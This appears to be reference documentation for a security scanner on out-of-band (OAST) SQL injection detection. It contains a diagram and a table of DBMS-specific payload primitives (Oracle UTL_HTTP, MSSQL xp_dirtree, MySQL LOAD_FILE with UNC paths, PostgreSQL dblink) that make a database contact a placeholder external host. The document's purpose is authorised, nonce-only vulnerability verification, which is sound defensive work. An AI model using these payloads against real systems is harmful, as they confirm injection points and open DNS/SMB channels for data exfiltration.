# Out-of-Band (OAST) SQL Injection: Protocols & Safe Verification

**Document Identifier:** SENTINEL-RES-OOB-08  
**Classification:** Network Interaction, Protocol Analysis & Safe Verification  

---

## 1. OAST Architectural Concept

Out-of-Band Application Security Testing (OAST) detects SQL injection by coercing the backend database engine to initiate an outbound network request (DNS lookup, HTTP request, SMB negotiation) to an external authoritative listener controlled by the auditor.

```
┌──────────────┐    1. HTTP Probe with DNS Nonce    ┌──────────────┐
│  SENTINEL    ├───────────────────────────────────►│  Web App     │
│  SCANNER     │                                    │  Server      │
└──────┬───────┘                                    └──────┬───────┘
       │                                                   │ 2. Unsafe Dynamic SQL
       │                                                   ▼
       │                                            ┌──────────────┐
       │                                            │  Database    │
       │                                            │  Engine      │
       │                                            └──────┬───────┘
       │                                                   │ 3. Triggers Network Call
       │                                                   ▼
       │         4. DNS Query Logged               ┌──────────────┐
       └────────────────────────────────────────────┤ Authoritative│
                   (e.g. snt_nonce.oast.local)      │ DNS Listener │
                                                    └──────────────┘
```

---

## 2. DBMS-Specific OAST Primitives

| Target DBMS | Native Network Function | Transport Protocol | Default Privileges Required |
|:---|:---|:---|:---|
| **Oracle Database** | `UTL_INADDR.GET_HOST_NAME('token.domain')`<br>`UTL_HTTP.REQUEST('http://token.domain')` | DNS (Port 53)<br>HTTP (Port 80) | Requires network ACL permissions (default in pre-11g; restricted in 11g+). |
| **Microsoft SQL Server** | `EXEC master..xp_dirtree '\\token.domain\share'`<br>`EXEC master..xp_fileexist '\\token.domain\share'` | SMB (Port 445)<br>DNS (Port 53) | Public role (low privilege); available by default in MSSQL 2012–2024. |
| **MySQL (Windows)** | `SELECT LOAD_FILE('\\\\token.domain\\a')`<br>`SELECT 'x' INTO OUTFILE '\\\\token.domain\\a'` | SMB (Port 445)<br>DNS (Port 53) | Requires `FILE` privilege and `secure_file_priv=""`. |
| **PostgreSQL** | `SELECT * FROM dblink('host=token.domain dbname=x', 'SELECT 1')` | TCP (Port 5432)<br>DNS (Port 53) | Requires `dblink` extension installed. |

---

## 3. Safe Verification & Data Protection Invariants

When conducting authorized OAST testing:
1. **Nonce-Only Resolution**: Never exfiltrate sensitive user data or production credentials over public DNS. The payload must transmit ONLY a random session nonce:
   `EXEC master..xp_dirtree '\\snt_98a7bc.listener.domain\test'`
2. **DNS Channel Superiority**: DNS queries pass through internal recursive resolvers even when outbound HTTP/HTTPS is blocked by firewall egress filtering.
3. **Correlation Tracking**: The listener associates the unique subdomain prefix with the scan tab, parameter, and timestamp, confirming vulnerability without modifying target data.
